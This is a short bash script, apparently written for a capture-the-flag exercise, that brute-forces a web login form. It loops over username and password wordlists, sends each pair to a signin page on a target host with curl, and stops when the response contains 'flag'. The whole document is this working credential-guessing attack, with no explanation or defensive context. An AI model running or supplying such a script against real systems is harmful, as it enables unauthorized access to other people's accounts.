#!/bin/bash
while read USERNAME;
do
	while read PASSWORD;
	do
		curl -X POST "http://$1/?page=signin&username=${USERNAME}&password=${PASSWORD}&Login=Login#" -s | grep flag
		if [[ $? -eq 0 ]]; then
			echo "Success: Credentials found, Username- $USERNAME & Password- $PASSWORD"
			exit
		fi
	done < $3
done < $2